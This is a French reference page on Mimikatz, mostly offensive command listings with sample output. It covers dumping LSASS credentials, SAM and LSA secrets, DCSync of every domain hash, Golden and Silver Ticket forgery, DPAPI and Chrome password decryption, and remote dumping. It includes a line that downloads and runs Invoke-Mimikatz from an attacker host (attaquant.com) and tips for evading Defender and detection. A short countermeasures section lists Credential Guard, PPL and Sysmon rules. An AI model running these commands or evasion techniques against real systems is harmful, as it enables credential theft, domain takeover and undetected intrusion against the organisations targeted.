---
title: Mimikatz
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [mimikatz, credentials, lsass, ntlm, kerberos, active-directory, sécurité]
date: 2026-03-22
---

# Mimikatz

Mimikatz est l'outil de référence pour l'extraction de credentials depuis la mémoire Windows. Développé par Benjamin Delpy, il exploite la façon dont Windows stocke les credentials dans LSASS (Local Security Authority Subsystem Service).

## Prérequis et lancement

```powershell
# Mimikatz nécessite des droits SeDebugPrivilege (généralement admin local)
# Lancer en tant qu'administrateur

# Activer les droits nécessaires (en premier)
mimikatz # privilege::debug
# → Privilege '20' OK → SeDebugPrivilege accordé

# Élever vers SYSTEM (si pas suffisant)
mimikatz # token::elevate
# → Impersonate NT AUTHORITY\SYSTEM

# Version PowerShell (Invoke-Mimikatz — chargement en mémoire, sans fichier)
IEX (New-Object Net.WebClient).DownloadString('http://attaquant.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

## Module sekurlsa — extraction depuis LSASS

```
sekurlsa — interagit directement avec le processus LSASS en mémoire
```

```powershell
# Dump de TOUS les credentials (mots de passe en clair, hashes NTLM, tickets Kerberos)
sekurlsa::logonpasswords

# Résultat typique :
# Authentication Id : 0 ; 123456 (00000000:0001e240)
# Session           : Interactive from 2
# User Name         : alice
# Domain            : DOMAINE
# Logon Server      : DC01
# Logon Time        : 01/01/2026 10:00:00
# SID               : S-1-5-21-...
#         msv :
#          [00000003] Primary
#          * Username : alice
#          * Domain   : DOMAINE
#          * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c   ← Hash NTLM
#          * SHA1     : ...
#         wdigest :
#          * Username : alice
#          * Domain   : DOMAINE
#          * Password : P@ssword123!   ← Mot de passe en clair (si WDigest activé)

# Seulement les hashes NTLM
sekurlsa::msv

# Seulement les tickets Kerberos en mémoire
sekurlsa::tickets
sekurlsa::tickets /export    # Exporter les tickets .kirbi

# WDigest — mots de passe en clair (Windows < 2012 R2 ou si activé manuellement)
sekurlsa::wdigest

# Hashes des clés Kerberos (RC4, AES128, AES256)
sekurlsa::ekeys

# Credentials des connexions RDP/Remote Desktop
sekurlsa::credman
```

### Dump de LSASS sans Mimikatz (pour éviter la détection)

```powershell
# Via Task Manager → Details → lsass.exe → Create Dump File
# Le fichier .dmp peut ensuite être analysé hors ligne

# Via comsvcs.dll (technique "comsvcs dump")
# SYSTEM requis
$lsass_pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full

# Via ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Analyse du dump hors ligne
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## Module lsadump — base de données SAM et NTDS

```powershell
# Dump de la base SAM locale (hashes des comptes locaux)
# Nécessite SYSTEM
lsadump::sam

# Avec les fichiers SAM/SYSTEM extraits (offline)
lsadump::sam /sam:C:\temp\sam.hive /system:C:\temp\system.hive

# LSA Secrets — services, mots de passe auto-logon, credentials mis en cache
lsadump::secrets

# DCSync — simuler un contrôleur de domaine pour récupérer les hashes
# Nécessite les droits GetChangesAll sur le domaine (Domain Admin ou délégation)
lsadump::dcsync /user:krbtgt           # Hash KRBTGT (pour Golden Ticket)
lsadump::dcsync /user:Administrator    # Hash Administrator
lsadump::dcsync /domain:domaine.local /all  # TOUS les hashes du domaine
lsadump::dcsync /domain:domaine.local /all /csv  # Format CSV

# Dump NTDS depuis un fichier ntds.dit (offline)
lsadump::lsa /patch   # Alternative sans DCSync (nécessite SYSTEM sur le DC)
```

## Module kerberos — tickets Kerberos

```powershell
# Lister les tickets en mémoire
kerberos::list
kerberos::list /export   # Exporter en .kirbi

# Injecter un ticket dans la session courante
kerberos::ptt ticket.kirbi
kerberos::ptt C:\tickets\ticket.kirbi

# Purger tous les tickets de la session
kerberos::purge

# Golden Ticket — forger un TGT avec le hash KRBTGT
kerberos::golden /user:Administrator /domain:domaine.local /sid:S-1-5-21-... /krbtgt:<hash_krbtgt> /id:500
# → Exporte un fichier ticket.kirbi valide 10 ans
kerberos::ptt ticket.kirbi   # Injecter

# Silver Ticket — forger un TGS pour un service spécifique
kerberos::golden /user:Administrator /domain:domaine.local /sid:S-1-5-21-... \
    /target:SERVER01.domaine.local /service:cifs /rc4:<hash_du_compte_machine>
```

## Module token — manipulation de tokens

```powershell
# Élever vers SYSTEM
token::elevate

# Usurper le token d'un processus (impersonation)
token::list              # Lister les tokens disponibles
token::impersonate       # Usurper un token interactif

# Revenir au token original
token::revert
```

## Module dpapi — déchiffrement de secrets Windows

```powershell
# DPAPI (Data Protection API) protège : credentials Chrome/Firefox, fichiers chiffrés, Credential Manager
# Tous les secrets DPAPI sont chiffrés avec la clé du compte utilisateur

# Masterkeys — clés de déchiffrement DPAPI
dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\abc123 /rpc

# Secrets Credential Manager (navigateurs, connexions réseau)
dpapi::cred /in:C:\Users\alice\AppData\Local\Microsoft\Credentials\abc

# Mots de passe Chrome (nécessite les masterkeys déchiffrées)
dpapi::chrome /in:C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

## Alternatives à Mimikatz (plus discrètes)

```bash
# Pypykatz — Mimikatz en Python (pour analyser des dumps hors ligne)
pip install pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam.hive --system system.hive

# Rubeus — équivalent Mimikatz pour Kerberos uniquement (.NET)
Rubeus.exe dump /service:krbtgt     # Dump des tickets TGT
Rubeus.exe asktgt /user:alice /rc4:ntlm_hash /domain:domaine.local /ptt

# CrackMapExec avec modules (dump à distance)
nxc smb 192.168.1.10 -u admin -p password -M mimikatz
nxc smb 192.168.1.10 -u admin -p password --sam

# SharpKatz / SafetyKatz — variantes .NET de Mimikatz pour l'évasion AV
```

## Contre-mesures

```
Protection de LSASS :
  ✓ Windows Credential Guard — les hashes NTLM et TGT sont dans une enclave VBS isolée
    → sekurlsa::logonpasswords ne fonctionne plus
  ✓ Protected Process Light (PPL) pour LSASS
    → Mimikatz ne peut pas accéder à LSASS sans driver signé
  ✓ Désactiver WDigest (Windows 10/2016+ : désactivé par défaut)
    HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest → UseLogonCredential = 0

Détection :
  Événement 4656 / 4663 : accès à lsass.exe
  Sysmon Event ID 10 : OpenProcess sur lsass
  Créer une règle Sysmon : ProcessAccess targetImage=lsass.exe GrantedAccess=0x1010
  Microsoft Defender : détecte Mimikatz nativement → obfuscation ou utilisation d'alternatives nécessaire
```

## Pièges courants

- **`sekurlsa::logonpasswords` sans `privilege::debug`** : la commande échoue silencieusement si SeDebugPrivilege n'est pas activé. Toujours `privilege::debug` en premier — succès = "Privilege '20' OK".
- **WDigest désactivé = pas de cleartext** : depuis Windows 8.1, WDigest est désactivé par défaut. `logonpasswords` ne retourne plus les mots de passe en clair, juste les hashes NT. Activer WDigest via registre (`UseLogonCredential=1`) + reconnexion utilisateur = cleartext de nouveau.
- **Compiled-in detection** : Defender détecte Mimikatz par signature même obfusqué basique. Pour bypass : compilation custom depuis sources, strings remplacées, ou utiliser `pypykatz` (Python, parse un dump LSASS hors-ligne).
- **Dump LSASS avec procdump et parser hors-ligne** : `procdump64.exe -ma lsass.exe` puis sur Kali `pypykatz lsa minidump lsass.dmp`. Procdump est signé Microsoft = pas détecté. Approche standard en 2026.
- **`sekurlsa::pth` ouvre un nouveau processus** : la commande Pass-the-Hash via Mimikatz lance un nouveau `cmd.exe` avec le contexte usurpé. Cela ouvre un cmd visible. Pour furtivité, préférer Impacket depuis Kali.
- **DCSync depuis un compte non-DA** : possible si l'ACL `Replicating Directory Changes` est accordée. `lsadump::dcsync` ne plante pas, mais peut requérir aussi `Replicating Directory Changes All`. BloodHound révèle qui en dispose.
- **Golden Ticket avec mauvaise endianness du SID** : le `/sid` doit être au format `S-1-5-21-X-Y-Z` (3 RID), PAS avec le RID final. Erreur classique : copier-coller le SID complet d'un user.
- **`kerberos::ptt` accepte les .kirbi et .ccache** : selon la version, certains tickets refusent d'être injectés en raison de validation PAC. Vérifier ensuite avec `klist`.
- **Credential Guard activé = LSASS isolé** : Windows 10/11 Enterprise + Credential Guard chiffre LSASS dans un VTL. Mimikatz ne peut plus lire les secrets. Détectable avec `DeviceGuardSmartStatus` PowerShell.
- **Mimikatz 32-bit vs 64-bit** : sur un Windows x64, utiliser `mimikatz.exe` (x64). La version x86 ne peut pas dumper LSASS x64.
